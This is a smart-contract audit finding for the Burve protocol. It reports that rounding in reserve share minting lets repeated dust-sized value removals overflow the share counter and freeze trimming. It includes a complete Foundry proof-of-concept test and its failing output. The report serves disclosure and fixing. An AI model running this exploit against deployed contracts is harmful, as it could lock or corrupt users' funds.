---
tags:
  - lang/solidity
  - sector/stable
  - sector/token
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
protocol: "[[Burve]]"
auditors:
  - TessKimy
report: "https://github.com/sherlock-audit/2025-04-burve-judging"
genome:
  - "[[integer-bounds]]"
  - "[[underflow]]"
  - "[[reward-calculation]]"
  - "[[known-pattern]]"
  - "[[math-is-safe]]"
  - "[[fix-arithmetic]]"
---
# H-9: Reserve Share Overflows Due to Too Strict Reward Calculation Mechanism

- id: 56958
- impact: HIGH
- protocol: Burve
- reporter: TessKimy (Sherlock)
- source: N/A

## Summary


The bug report discusses a problem with the reserve share calculation mechanism in a system. The issue was discovered by a user named TessKimy. The problem is caused by precision-sensitive arithmetic and lack of lower bounds in the deposit logic. This makes it vulnerable to silent rounding attacks, which can cause the reserve share counter to overflow, leading to destabilization of the reserve's accounting and breaking of value logic. The bug can be triggered by repeatedly calling a certain function with crafted values, causing the share minting to grow exponentially. The bug has a significant impact as it can lead to total share overflow and silent amplification. A proof-of-concept setup is provided to test the bug, and the output shows that it fails with an arithmetic underflow or overflow error. The bug has been fixed by the protocol team in a recent commit.

## Details

Source: https://github.com/sherlock-audit/2025-04-burve-judging/issues/452 

## Found by 
TessKimy

### Summary

In the system's vertex balancing logic, `trimBalance()` withdraws surplus funds from a vertex's vault and deposits them into the global reserve. The reserve maintains its own share accounting per token, and share minting is based on proportional value derived from vault balances.

Due to **precision-sensitive arithmetic and lack of lower bounds**, the deposit logic is vulnerable to **silent rounding attacks** that cause `reserve.shares[idx]` to inflate gradually or exponentially. Repeated calls to `trimBalance()` ( it's not public we will call it with removeValue for trimming ) with crafted values can amplify this inflation and potentially lead to **overflow of the share counter**, destabilizing the reserve's accounting and breaking value logic across closures.



### Root Cause

In `trimBalance()`:

```solidity
uint256 residualReal = realBalance - targetReal;
...
reserveSharesEarned = ReserveLib.deposit(
    vProxy,
    self.vid,
    residualReal - bgtResidual
);
```

If `bgtResidual - residualReal` is so close to zero, then the deposit call receives a very small nonzero amount-**insufficient to affect the vault's balance** meaningfully but still capable of minting shares due to rounding.

In [`ReserveLib.deposit()`](https://github.com/sherlock-audit/2025-04-burve/blob/44cba36e2a0c3cd7b6999459bf7746db92f8cc0a/Burve/src/multi/vertex/Reserve.sol#L46):

```solidity
shares = (balance == 0)
    ? amount * SHARE_RESOLUTION
    : (amount * reserve.shares[idx]) / balance;
```

When `amount > 0` but `balance ≈ 0`, the share calculation becomes:

$$
\text{shares} = \frac{\text{amount} \cdot \text{reserve.shares[idx]}}{\text{balance}} \rightarrow \text{inflates rapidly}
$$

This allows the attacker to:

1. Induce tiny residuals repeatedly using trim cycles.
2. Cause share minting to diverge and grow exponentially due to division by near-zero balances.
3. Eventually **overflow the `reserve.shares[idx]` counter**, destabilizing reserve logic.


### Internal Pre-conditions

No need

### External Pre-conditions

No need

### Attack Path

Attack is very easy to understand in PoC

### Impact

* **Total share overflow**, leading to irreversible corruption of internal accounting.
* **Silent amplification** through repeated small trims - no reverts occur due to the design relying on best-effort balance corrections.

Because the rounding behavior does not revert, the issue can be triggered with minimal input. It reverts on trim balance calls. Therefore, none of the function can work anymore because it will always fail when we try to deposit that balance to reserve.

### PoC

You can test it by following PoC test with full setup
For better visibility add console.log to ReserveLib::deposit function

```solidity
        shares = (balance == 0) 
            ? amount * SHARE_RESOLUTION 
            : (amount * reserve.shares[idx]) / balance; 
        console.log("Reserve shares: ", shares);
        reserve.shares[idx] += shares; 
        console.log("Reserve shares total: ", reserve.shares[idx])
```

### Full PoC Setup

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/multi/Diamond.sol";
import "../src/multi/facets/LockFacet.sol";
import "../src/multi/facets/SimplexFacet.sol";
import "../src/multi/facets/SwapFacet.sol";
import "../src/multi/facets/ValueFacet.sol";
import "../src/multi/facets/ValueTokenFacet.sol";
import "../src/multi/facets/VaultFacet.sol";
import "../src/integrations/adjustor/DecimalAdjustor.sol";
import "./MockERC20.sol";
import "../src/integrations/pseudo4626/noopVault.sol";

contract BaseTest is Test {
    SimplexDiamond dia;
    address diaA;
    ERC20 USDC;
    ERC20 DAI;
    uint16 _cid;
    NoopVault usdc_vault;
    NoopVault dai_vault;
    function setUp() public {

        // Deploy facets
        address simplexFacet = address(new SimplexFacet());
        address swapFacet = address(new SwapFacet());
        address valueFacet = address(new ValueFacet());
        address valueTokenFacet = address(new ValueTokenFacet());
        address vaultFacet = address(new VaultFacet());

        USDC = new MockERC20("USDC", "USDC", 1_000_000_000_000e6, 6);
        DAI = new MockERC20("DAI", "DAI", 1_000_000_000_000e18, 18);
        
        address adjustor = address(new DecimalAdjustor());
        BurveFacets memory facets = BurveFacets({
            valueFacet: valueFacet,
            valueTokenFacet: valueTokenFacet,
            simplexFacet: simplexFacet,
            swapFacet: swapFacet,
            vaultFacet: vaultFacet,
            adjustor: adjustor
        });
        
        dia = new SimplexDiamond(facets, "Burve", "BRV");
        diaA = address(dia);

        usdc_vault = new NoopVault(USDC, "USDC Vault", "USDCV");
        dai_vault = new NoopVault(DAI, "DAI Vault", "DAIV");

        VaultType usdc_vault_type = VaultType.E4626;
        VaultType dai_vault_type = VaultType.E4626;

        string memory signature = "addVertex(address,address,uint8)";
        bytes memory argsUSDC = abi.encode(address(USDC), address(usdc_vault), usdc_vault_type);
        bytes memory argsDAI = abi.encode(address(DAI), address(dai_vault), dai_vault_type);

        diaA.call(encodeCall(signature, argsUSDC));
        diaA.call(encodeCall(signature, argsDAI));

        deal(address(USDC), address(this), 1_000_000e6);
        deal(address(DAI), address(this), 1_000_000e18);

        USDC.approve(diaA, type(uint256).max);
        DAI.approve(diaA, type(uint256).max);

        _cid = 0x0003;
        uint128 startingTarget = 1e12;
        uint128 baseFeeX128 = 0;
        uint128 protocolTakeX128 = 0;

        signature = "addClosure(uint16,uint128,uint128,uint128)";
        bytes memory args = abi.encode(_cid, startingTarget, baseFeeX128, protocolTakeX128);
        diaA.call(encodeCall(signature, args));

    }
    function testReserve() public {
        address bob = address(0xB0B);
        address whale = address(0x11);

        deal(address(USDC), bob, 1_000_000e6);
        deal(address(DAI), bob, 1_000_000e18);
        deal(address(USDC), whale, 10_000_000e6);
        deal(address(DAI), whale, 10_000_000e18);
        vm.startPrank(whale);

        USDC.approve(diaA, type(uint256).max);
        DAI.approve(diaA, type(uint256).max);
        
        string memory addValueSignature = "addValue(address,uint16,uint128,uint128)";
        bytes memory addValue1Million = abi.encode(whale, _cid, 2_000_000e18, 0);

        (bool sc5, bytes memory d5) = diaA.call(encodeCall(addValueSignature, addValue1Million));
        assert(sc5);

        vm.startPrank(bob);

        USDC.approve(diaA, type(uint256).max);
        DAI.approve(diaA, type(uint256).max);

        bytes memory addValue450 = abi.encode(bob, _cid, 450, 0);

        (bool sc, bytes memory d) = diaA.call(encodeCall(addValueSignature, addValue450));

        assert(sc);
        DAI.transfer(address(dai_vault), 4);

        console.log("\nRemove value part");

        for(uint256 i = 0; i < 450; i++){
            console.log("\n\n");
            string memory removeValueSignature = "removeValue(address,uint16,uint128,uint128)";
            bytes memory removeValueDust = abi.encode(bob, _cid, 1, 0);

            (bool sc2, bytes memory d2) = diaA.call(encodeCall(removeValueSignature, removeValueDust));
            // Don't need to check success, most probably it will revert 
            // for some of them but it doesn't matter
        }
        

        vm.stopPrank();

        vm.startPrank(whale);
        
        string memory removeValueSignature = "removeValue(address,uint16,uint128,uint128)";
        bytes memory removeValue1million = abi.encode(whale, _cid, 2_000_000e18, 0);

        (bool sc3, bytes memory d3) = diaA.call(encodeCall(removeValueSignature, removeValue1million));
        assert(sc3);
        

    }
}
```

### Output

It will fail with following error:

```console
    │   │   ├─ [0] console::log("Reserve shares: ", 45955919424987027472638238447793362177605405256200442851061023676772480159266 [4.595e76]) [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    └─ ← [Revert] panic: assertion failed (0x01)

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 317.06ms (305.83ms CPU time)

Ran 1 test suite in 2.19s (317.06ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/BaseTest.t.sol:BaseTest
[FAIL: panic: assertion failed (0x01)] testReserve() (gas: 83890019)
```

### Mitigation

Apply minimum balance difference between recorded balance and gathered balance before triggering trim balance

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/itos-finance/Burve/pull/78
